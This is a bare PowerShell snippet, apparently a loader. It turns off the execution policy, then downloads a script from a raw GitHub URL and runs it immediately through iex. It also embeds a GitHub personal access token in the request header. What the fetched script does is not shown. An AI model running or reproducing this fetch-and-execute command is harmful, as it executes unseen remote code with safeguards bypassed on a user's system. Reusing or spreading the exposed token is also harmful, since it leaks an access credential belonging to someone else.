Set-ExecutionPolicy Bypass -Scope Process -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex (Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/Playtool/test/main/test.ps1' -Headers @{ Authorization = "Bearer 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" })
